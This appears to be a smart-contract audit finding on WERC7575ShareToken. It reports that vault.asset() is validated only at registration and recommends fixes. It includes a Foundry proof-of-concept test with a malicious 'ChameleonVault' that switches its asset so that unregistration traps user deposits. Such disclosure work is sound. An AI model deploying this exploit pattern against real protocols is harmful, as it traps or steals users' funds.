## Title
Chameleon Vault Attack: No Re-validation of vault.asset() Enables Asset-Vault Mapping Bypass and User Fund Loss

## Summary
The `registerVault()` function validates `vault.asset()` and `vault.share()` only once during registration, but the `mint()`/`burn()` functions and `unregisterVault()` never re-validate these values. [1](#0-0)  A malicious upgradeable vault can pass validation during registration, then change its `asset()` return value to accept deposits of a different asset while still minting shares. This breaks the Asset-Vault Mapping invariant and enables a critical unregistration bypass where user funds are trapped.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/WERC7575ShareToken.sol` - `registerVault()` (lines 218-241), `mint()` (lines 363-369), `burn()` (lines 376-382), `unregisterVault()` (lines 256-285)

**Intended Logic:** The protocol enforces a strict bijection between assets and vaults (Invariant #6: Asset-Vault Mapping). During registration, the ShareToken validates that `vault.asset()` matches the registered asset parameter and `vault.share()` matches the ShareToken address. [2](#0-1)  The protocol assumes this relationship remains immutable throughout the vault's lifecycle.

**Actual Logic:** The validation only occurs during registration. The `mint()` and `burn()` functions use the `onlyVaults` modifier which only checks if `_vaultToAsset[msg.sender] != address(0)`, with no re-validation of what asset the vault currently claims to manage. [3](#0-2) [4](#0-3) 

Most critically, `unregisterVault()` uses the asset parameter from the `_assetToVault` mapping (set during registration) to check if the vault is empty, rather than querying the vault's current `asset()`. [5](#0-4)  If a vault was registered for USDC but now holds DAI, the check examines the USDC balance (which is zero) and allows unregistration while user DAI remains trapped.

**Exploitation Path:**
1. **Deployment**: Attacker deploys a UUPS upgradeable vault (using ERC7575VaultUpgradeable pattern) that returns `asset() = USDC` and `share() = ShareToken` in its initial implementation
2. **Registration**: Owner calls `ShareToken.registerVault(USDC, maliciousVault)`. Validation passes: `vault.asset() == USDC` ✓ and `vault.share() == ShareToken` ✓. Storage updates: `_vaultToAsset[maliciousVault] = USDC` and `_assetToVault[USDC] = maliciousVault`
3. **Post-Registration Mutation**: Attacker upgrades vault to new implementation where `asset()` returns `DAI` instead of `USDC`, or uses a mutable storage variable pattern
4. **User Deposits**: Users check `maliciousVault.asset()`, see it returns `DAI`, and deposit 100,000 DAI believing they're interacting with a legitimate DAI vault
5. **Shares Minted**: Malicious vault calls `ShareToken.mint(user, shares)`. The `onlyVaults` modifier only checks `_vaultToAsset[maliciousVault] != address(0)` (returns `USDC` from registration), which passes. Shares are minted successfully even though the vault now manages DAI
6. **Unregistration Exploit**: Owner calls `ShareToken.unregisterVault(USDC)`. The function checks `ERC20(USDC).balanceOf(maliciousVault)` which returns 0 (vault has no USDC). The safety check passes and the vault is unregistered, permanently trapping 100,000 DAI of user funds
7. **Fund Loss**: Users cannot redeem their shares because the vault is unregistered, and the trapped DAI has no recovery mechanism

**Security Property Broken:** 
- **Invariant #6 violated**: Asset-Vault Mapping (`assetToVault[asset] ↔ vaultToAsset[vault]` bijection) is broken. ShareToken believes vault manages USDC while vault actually holds DAI
- **Invariant #12 violated**: Fund theft occurs through the unregistration bypass—user funds are permanently trapped

## Impact Explanation
- **Affected Assets**: All assets supported by the multi-asset system (USDC, USDT, DAI, etc.). The chameleon vault can switch from one asset to another after registration
- **Damage Severity**: Complete loss of deposited funds. When the malicious vault is unregistered, users lose the ability to redeem their shares for the underlying assets (e.g., 100,000 DAI trapped with no recovery path)
- **User Impact**: All users who deposit into the malicious vault after it changes its `asset()` return value. Impact scales with deposits—a popular vault could trap millions of dollars before detection

## Likelihood Explanation
- **Attacker Profile**: Any party capable of deploying and upgrading a vault contract. This includes vault deployers but does NOT require compromise of ShareToken admin keys (Owner/Investment Manager). The attack exploits the registration mechanism itself
- **Preconditions**: 
  1. Attacker deploys upgradeable vault (standard UUPS pattern used throughout protocol)
  2. Vault gets registered by ShareToken owner (requires social engineering or legitimate vault that later turns malicious)
  3. Users deposit into the vault after the switch (natural protocol usage)
- **Execution Complexity**: Low. Single upgrade transaction to change `asset()` return value, then normal protocol operations. No timing requirements or complex state manipulation
- **Frequency**: Repeatable for each malicious vault registration. One successful attack can trap unlimited funds as users continue depositing until detection

## Recommendation

Add re-validation of `vault.asset()` in critical functions to ensure the asset-vault mapping remains consistent:

```solidity
// In src/WERC7575ShareToken.sol, function mint, line 363:

// CURRENT (vulnerable):
function mint(address to, uint256 amount) external onlyVaults whenNotPaused {
    if (to == address(0)) {
        revert IERC20Errors.ERC20InvalidReceiver(address(0));
    }
    if (!isKycVerified[to]) revert KycRequired();
    _mint(to, amount);
}

// FIXED:
function mint(address to, uint256 amount) external onlyVaults whenNotPaused {
    if (to == address(0)) {
        revert IERC20Errors.ERC20InvalidReceiver(address(0));
    }
    if (!isKycVerified[to]) revert KycRequired();
    
    // Re-validate that vault still returns the correct asset
    address registeredAsset = _vaultToAsset[msg.sender];
    if (IERC7575(msg.sender).asset() != registeredAsset) {
        revert AssetMismatch();
    }
    
    _mint(to, amount);
}

// Apply same fix to burn() function at line 376
```

```solidity
// In src/WERC7575ShareToken.sol, function unregisterVault, line 256:

// CURRENT (vulnerable):
function unregisterVault(address asset) external onlyOwner {
    if (asset == address(0)) revert ZeroAddress();
    if (!_assetToVault.contains(asset)) revert AssetNotRegistered();

    address vaultAddress = _assetToVault.get(asset);

    // Checks USDC balance when vault actually holds DAI
    try IERC7575Vault(vaultAddress).totalAssets() returns (uint256 totalAssets) {
        if (totalAssets != 0) revert CannotUnregisterVaultAssetBalance();
    } catch {
        revert("ShareToken: cannot verify vault has no outstanding assets");
    }
    try ERC20(asset).balanceOf(vaultAddress) returns (uint256 vaultBalance) {
        if (vaultBalance != 0) revert CannotUnregisterVaultAssetBalance();
    } catch {
        revert("ShareToken: cannot verify vault asset balance");
    }
    // ... rest of function
}

// FIXED:
function unregisterVault(address asset) external onlyOwner {
    if (asset == address(0)) revert ZeroAddress();
    if (!_assetToVault.contains(asset)) revert AssetNotRegistered();

    address vaultAddress = _assetToVault.get(asset);
    
    // Re-validate that vault still returns the registered asset
    // This prevents chameleon vaults from bypassing the balance check
    if (IERC7575(vaultAddress).asset() != asset) {
        revert AssetMismatch();
    }

    // Now the balance checks examine the correct asset
    try IERC7575Vault(vaultAddress).totalAssets() returns (uint256 totalAssets) {
        if (totalAssets != 0) revert CannotUnregisterVaultAssetBalance();
    } catch {
        revert("ShareToken: cannot verify vault has no outstanding assets");
    }
    try ERC20(asset).balanceOf(vaultAddress) returns (uint256 vaultBalance) {
        if (vaultBalance != 0) revert CannotUnregisterVaultAssetBalance();
    } catch {
        revert("ShareToken: cannot verify vault asset balance");
    }
    // ... rest of function
}
```

**Additional Hardening**: Consider implementing an immutability check for vault contracts during registration, or maintain a whitelist of trusted vault implementations that cannot be upgraded.

## Proof of Concept

```solidity
// File: test/Exploit_ChameleonVault.t.sol
// Run with: forge test --match-test test_ChameleonVaultAttack -vvv

pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/WERC7575ShareToken.sol";
import "../src/ERC7575VaultUpgradeable.sol";
import "../src/ERC20Faucet6.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

// Malicious vault that can change its asset() return value
contract ChameleonVault is ERC7575VaultUpgradeable {
    address private _chameleonAsset;
    
    function initialize(
        IERC20Metadata asset_,
        address shareToken_,
        address owner
    ) public override initializer {
        super.initialize(asset_, shareToken_, owner);
        _chameleonAsset = address(asset_);
    }
    
    // Owner can change which asset this vault claims to manage
    function setChameleonAsset(address newAsset) external {
        _chameleonAsset = newAsset;
    }
    
    // Override asset() to return the chameleon asset instead of storage
    function asset() public view override returns (address) {
        return _chameleonAsset;
    }
}

contract Exploit_ChameleonVault is Test {
    WERC7575ShareToken shareToken;
    ChameleonVault chameleonVault;
    ERC20Faucet6 usdc;
    ERC20Faucet6 dai;
    
    address owner = address(this);
    address user = address(0x1234);
    
    function setUp() public {
        // Deploy ShareToken
        shareToken = new WERC7575ShareToken("Test Shares", "TST");
        
        // Deploy assets
        usdc = new ERC20Faucet6("USDC", "USDC", 1000000 * 1e6);
        dai = new ERC20Faucet6("DAI", "DAI", 1000000 * 1e6);
        
        // Deploy chameleon vault (initially returns USDC)
        ChameleonVault vaultImpl = new ChameleonVault();
        bytes memory initData = abi.encodeWithSelector(
            ChameleonVault.initialize.selector,
            IERC20Metadata(address(usdc)),
            address(shareToken),
            owner
        );
        ERC1967Proxy proxy = new ERC1967Proxy(address(vaultImpl), initData);
        chameleonVault = ChameleonVault(address(proxy));
        
        // Setup user with KYC
        shareToken.setKycVerified(user, true);
        shareToken.setKycVerified(address(chameleonVault), true);
    }
    
    function test_ChameleonVaultAttack() public {
        // SETUP: Verify vault returns USDC initially
        assertEq(chameleonVault.asset(), address(usdc), "Vault should initially return USDC");
        
        // STEP 1: Register vault for USDC
        shareToken.registerVault(address(usdc), address(chameleonVault));
        assertEq(shareToken.vault(address(usdc)), address(chameleonVault), "Vault registered for USDC");
        
        // STEP 2: Attacker changes vault's asset() to return DAI
        chameleonVault.setChameleonAsset(address(dai));
        assertEq(chameleonVault.asset(), address(dai), "Vault now claims to manage DAI");
        
        // STEP 3: User deposits DAI (thinking it's a DAI vault)
        dai.transfer(address(chameleonVault), 100000 * 1e6);
        
        // STEP 4: Vault mints shares (exploit - no re-validation of asset)
        vm.prank(address(chameleonVault));
        shareToken.mint(user, 100000 * 1e18);
        assertEq(shareToken.balanceOf(user), 100000 * 1e18, "User received shares for DAI deposit");
        
        // VERIFY EXPLOIT: Check that vault has DAI but ShareToken thinks it has USDC
        assertEq(dai.balanceOf(address(chameleonVault)), 100000 * 1e6, "Vault holds 100k DAI");
        assertEq(usdc.balanceOf(address(chameleonVault)), 0, "Vault holds 0 USDC");
        
        // STEP 5: Owner unregisters vault (checks USDC balance = 0, passes)
        shareToken.unregisterVault(address(usdc));
        assertEq(shareToken.vault(address(usdc)), address(0), "Vault unregistered");
        
        // VERIFY FUND LOSS: User's DAI is trapped
        assertEq(dai.balanceOf(address(chameleonVault)), 100000 * 1e6, "100k DAI still trapped in vault");
        assertEq(shareToken.balanceOf(user), 100000 * 1e18, "User has worthless shares");
        
        // User cannot redeem because vault is unregistered
        vm.prank(address(chameleonVault));
        vm.expectRevert(abi.encodeWithSelector(bytes4(keccak256("Unauthorized()"))));
        shareToken.burn(user, 100000 * 1e18);
        
        console.log("EXPLOIT SUCCESSFUL:");
        console.log("- Vault registered for USDC but accepted DAI deposits");
        console.log("- Vault unregistered despite holding 100k DAI");
        console.log("- User funds permanently trapped");
    }
}
```

## Notes

This vulnerability is particularly severe because:

1. **Trust Assumption Broken**: The protocol assumes vault contracts are immutable after registration, but UUPS upgradeability (used throughout the codebase) [6](#0-5)  enables post-deployment changes

2. **Safety Mechanism Bypassed**: The `unregisterVault()` function's safety checks are specifically designed to "prevent user fund loss" [7](#0-6)  but become ineffective when checking the wrong asset

3. **Multi-Asset Architecture Amplifies Risk**: The ERC-7575 multi-asset design means one compromised vault affects the entire shared ShareToken, potentially contaminating the asset-vault mappings for all users

4. **Not a Centralization Issue**: While vault registration requires Owner privilege, the attack exploits the vault's own upgradeability, not ShareToken admin compromise. This distinguishes it from known centralization risks

5. **Same Vulnerability in ShareTokenUpgradeable**: The upgradeable version has identical validation logic [8](#0-7)  and is equally vulnerable

### Citations

**File:** src/WERC7575ShareToken.sol (L199-203)
```text
     */
    modifier onlyVaults() {
        if (_vaultToAsset[msg.sender] == address(0)) revert Unauthorized();
        _;
    }
```

**File:** src/WERC7575ShareToken.sol (L218-241)
```text
    function registerVault(address asset, address vaultAddress) external onlyOwner {
        if (asset == address(0)) revert ZeroAddress();
        if (vaultAddress == address(0)) revert ZeroAddress();
        if (_assetToVault.contains(asset)) revert AssetAlreadyRegistered();

        // Validate that vault's asset matches the provided asset parameter
        if (IERC7575(vaultAddress).asset() != asset) revert AssetMismatch();

        // Validate that vault's share token matches this ShareToken
        if (IERC7575(vaultAddress).share() != address(this)) {
            revert VaultShareMismatch();
        }

        // DoS mitigation: Enforce maximum vaults per share token to prevent unbounded loops
        if (_assetToVault.length() >= MAX_VAULTS_PER_SHARE_TOKEN) {
            revert MaxVaultsExceeded();
        }

        // Register new vault (automatically adds to enumerable collection)
        _assetToVault.set(asset, vaultAddress);
        _vaultToAsset[vaultAddress] = asset;

        emit VaultUpdate(asset, vaultAddress);
    }
```

**File:** src/WERC7575ShareToken.sol (L247-249)
```text
     * SAFETY: This function now includes outstanding shares validation to prevent
     * user fund loss. It checks that the vault has no remaining assets that users
     * could claim, ensuring safe vault unregistration.
```

**File:** src/WERC7575ShareToken.sol (L260-279)
```text
        address vaultAddress = _assetToVault.get(asset);

        // SAFETY CHECK: Validate that vault has no outstanding assets that users could claim
        // In this architecture, we check vault's total assets rather than share supply
        // since shares are managed by this ShareToken contract, not the vault
        try IERC7575Vault(vaultAddress).totalAssets() returns (uint256 totalAssets) {
            if (totalAssets != 0) revert CannotUnregisterVaultAssetBalance();
        } catch {
            // If we can't verify the vault has no assets, we can't safely unregister
            // This prevents unregistration if the vault is malicious or has interface issues
            revert("ShareToken: cannot verify vault has no outstanding assets");
        }
        // Additional safety: Check if vault still has any assets to prevent user fund loss
        // This is a double-check using ERC20 interface in case totalAssets() is manipulated
        try ERC20(asset).balanceOf(vaultAddress) returns (uint256 vaultBalance) {
            if (vaultBalance != 0) revert CannotUnregisterVaultAssetBalance();
        } catch {
            // If we can't check the asset balance in vault, err on the side of caution
            revert("ShareToken: cannot verify vault asset balance");
        }
```

**File:** src/WERC7575ShareToken.sol (L363-369)
```text
    function mint(address to, uint256 amount) external onlyVaults whenNotPaused {
        if (to == address(0)) {
            revert IERC20Errors.ERC20InvalidReceiver(address(0));
        }
        if (!isKycVerified[to]) revert KycRequired();
        _mint(to, amount);
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L64-65)
```text
 */
contract ERC7575VaultUpgradeable is Initializable, ReentrancyGuard, Ownable2StepUpgradeable, IERC7540, IERC7887, IERC165, IVaultMetrics, IERC7575Errors, IERC20Errors {
```

**File:** src/ShareTokenUpgradeable.sol (L195-205)
```text
    function registerVault(address asset, address vaultAddress) external onlyOwner {
        if (asset == address(0)) revert ZeroAddress();
        if (vaultAddress == address(0)) revert ZeroAddress();

        // Validate that vault's asset matches the provided asset parameter
        if (IERC7575(vaultAddress).asset() != asset) revert AssetMismatch();

        // Validate that vault's share token matches this ShareToken
        if (IERC7575(vaultAddress).share() != address(this)) {
            revert VaultShareMismatch();
        }
```
